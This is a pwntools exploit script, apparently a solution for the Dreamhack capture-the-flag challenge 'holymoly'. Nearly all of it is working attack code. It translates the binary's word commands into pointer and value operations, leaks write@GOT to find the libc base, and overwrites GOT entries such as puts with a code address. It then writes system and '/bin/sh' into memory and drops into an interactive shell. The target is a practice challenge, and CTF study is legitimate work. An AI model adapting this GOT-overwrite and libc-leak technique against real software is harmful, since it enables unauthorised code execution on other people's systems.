from pwn import *

HOST, PORT = "host8.dreamhack.games 1".split()

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

e = ELF("./holymoly")
libc = e.libc  # ELF("./libc-2.31.so")


def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


TOK = {
    "HOLYMOLY": b"holymoly",
    "ROLYPOLY": b"rolypoly",
    "MONOPOLY": b"monopoly",
    "GUACAMOLE": b"guacamole",
    "ROBOCARPOLI": b"robocarpoli",
    "HALLIGALLI": b"halligalli",
    "BROCCOLI": b"broccoli",
    "BORDERCOLLIE": b"bordercollie",
    "BLUEBERRY": b"blueberry",
    "CRANBERRY": b"cranberry",
    "MYSTERY": b"mystery",
}

AMOUNTS = (0x1000, 0x100, 0x10, 0x1)
INC_TOKENS = (
    TOK["HOLYMOLY"],
    TOK["ROLYPOLY"],
    TOK["MONOPOLY"],
    TOK["GUACAMOLE"],
)
DEC_TOKENS = (
    TOK["ROBOCARPOLI"],
    TOK["HALLIGALLI"],
    TOK["BROCCOLI"],
    TOK["BORDERCOLLIE"],
)


def emit(token, count=1):
    return token * count


def encode_delta(amount, tokens):
    parts = []
    for step, token in zip(AMOUNTS, tokens):
        count, amount = divmod(amount, step)
        if count:
            parts.append(emit(token, count))
    return b"".join(parts)


def toggle_ptrval():
    return TOK["MYSTERY"]


def read_qword():
    return TOK["BLUEBERRY"]


def write_qword():
    return TOK["CRANBERRY"]


def inc_ptr(amount):
    return encode_delta(amount, INC_TOKENS)


def dec_ptr(amount):
    return encode_delta(amount, DEC_TOKENS)


def inc_val(amount):
    return encode_delta(amount, INC_TOKENS)


def write_byte_and_step(byte):
    # Switch to val, write byte, reset val, switch back to ptr, then ptr += 1.
    hi, lo = divmod(byte, 0x10)
    return b"".join(
        [
            toggle_ptrval(),
            emit(TOK["MONOPOLY"], hi),
            emit(TOK["GUACAMOLE"], lo),
            write_qword(),
            emit(TOK["BROCCOLI"], hi),
            emit(TOK["BORDERCOLLIE"], lo),
            toggle_ptrval(),
            emit(TOK["GUACAMOLE"]),
        ]
    )


def start_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    # return remote("localhost", 80)
    return e.process()  # env={"LD_PRELOAD": "./libc-2.31.so"})


puts_got = e.got["puts"]
write_got = e.got["write"]
printf_got = e.got["printf"]
setvbuf_got = e.got["setvbuf"]
scanf_got = e.got["__isoc99_scanf"]

slog("puts", puts_got)
slog("write_got", write_got)  # 0x404020
slog("printf_got", printf_got)
slog("setvbuf_got", setvbuf_got)

p = start_process()

# Stage 1: leak write@GOT, then smash puts@GOT with .text entry (0x401110).
leak = b"".join(
    [
        toggle_ptrval(),  # ptr mode
        inc_ptr(0x404000),
        inc_ptr(0x20),  # write@GOT (0x404020)
        read_qword(),
        dec_ptr(0x8),  # puts@GOT (0x404018)
        toggle_ptrval(),  # val mode
        inc_val(0x401110),
        write_qword(),
    ]
)

p.sendlineafter(b"? ", leak)
libc.address = u64(p.recv(8)) - libc.sym["write"]
system = libc.sym["system"]
pause()

slog("libc_base", libc.address)
slog("system", system)

# Stage 2: write system, "/bin/sh", and a pointer to the string.
payload = b"".join(
    [
        toggle_ptrval(),  # ptr mode
        inc_ptr(0x404000),
        inc_ptr(0x40),  # 0x404040
    ]
)

for b in p64(system)[:6]:
    payload += write_byte_and_step(b)

payload += emit(TOK["GUACAMOLE"], 2)  # align ptr to 0x404048

for b in b"/bin/sh":
    payload += write_byte_and_step(b)

payload += emit(TOK["GUACAMOLE"])
payload += emit(TOK["MONOPOLY"], 0x5)  # ptr = stderr

for b in p64(scanf_got)[:6]:
    payload += write_byte_and_step(b)

payload += toggle_ptrval()
payload += write_qword()

print(len(payload))
p.sendlineafter(b"?", payload)

gdb.attach(p)
pause()

p.interactive()
